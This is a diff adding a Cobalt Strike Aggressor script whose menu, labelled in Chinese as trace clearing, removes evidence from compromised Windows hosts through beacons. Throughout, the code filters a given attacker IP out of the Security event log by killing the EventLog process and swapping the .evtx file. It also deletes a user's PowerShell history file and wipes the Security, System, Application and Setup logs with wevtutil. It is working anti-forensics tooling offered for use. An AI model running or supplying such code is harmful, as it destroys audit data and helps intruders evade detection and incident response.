@@ -1,0 +1,70 @@
+$bid = $1;
+menu "痕迹清除"{
+    item "RDP登录日志清除" {
+        rdpclear($bid);
+    }
+    
+    item "powershell执行命令历史清除"{
+        foreach $id ($bid){
+            $dialog = dialog("PowerShell History Clear", %(username => "Administrator", bid => $id), &powershellhistory);
+            dialog_description($dialog, "用于清除非windows powershell执行命令记录(Windows Server 2016以下执行的powershell命令不会存储)");
+            drow_text($dialog, "username", "username:");
+            dbutton_action($dialog, "run");
+            dialog_show($dialog);
+        }
+    }
+    
+    item "清除指定日志"{
+        foreach $id ($bid){
+            $dialog = dialog("Eventlog Clear", %(bid => $id), &eventlogclear);
+            dialog_description($dialog, "清除指定windows日志");
+            drow_checkbox($dialog, "Security", "Security Evtx", "Security");
+            drow_checkbox($dialog, "System", "System Evtx", "System");
+            drow_checkbox($dialog, "Application", "Application Evtx", "Application");
+            drow_checkbox($dialog, "Setup", "Setup Evtx", "Setup");
+            dbutton_action($dialog, "run");
+            dialog_show($dialog);
+        }
+    }
+}
+
+sub rdpclear {
+	foreach $bid ($1){
+		if (-isadmin $bid){
+			bshell($bid, "tasklist /svc | findstr \"eventlog\"")
+			bpowerpick($bid, "wevtutil epl Security C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx /q:\"*[EventData[(Data[@Name='IpAddress']='192.168.93.140')]]\" /ow:true;write-host \"[*] Dump IPAddress:127.0.0.1 New evtx\";\$envetlogpid=Get-WmiObject -Class win32_service -Filter \"name = 'eventlog'\" | select -exp ProcessId;write-host \"[*] Kill EventLog Process\";taskkill /F /PID \$envetlogpid;write-host \"[*] Move New Security Evtx ->\";Move-Item C:\\Windows\\System32\\winevt\\Logs\\Security_new.evtx C:\\Windows\\System32\\winevt\\Logs\\Security.evtx -force;write-host \"[*] Run Eventlog Service\";net start eventlog");
+			
+		}else{
+			berror($bid, "非管理员权限")
+		}
+	}
+}
+
+sub powershellhistory{
+	$files = "C:\\Users\\$3['username']\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
+	brm($3["bid"], $files);
+}
+
+sub eventlogclear{
+	if($3["Security"] eq 'true'){
+		btask($3['bid'], "Clear EventLog Security");
+		bshell($3['bid'], "wevtutil cl Security");
+	}
+	
+	if($3["System"] eq 'true'){
+		btask($3['bid'], "Clear EventLog System");
+		bshell($3['bid'], "wevtutil cl System");
+	}
+	
+	if($3["Application"] eq 'true'){
+		btask($3['bid'], "Clear EventLog Application");
+		bshell($3['bid'], "wevtutil cl Application");
+	}
+	
+	if($3["Setup"] eq 'true'){
+		btask($3['bid'], "Clear EventLog Setup");
+		bshell($3['bid'], "wevtutil cl Setup");
+	}
+	
+}
+
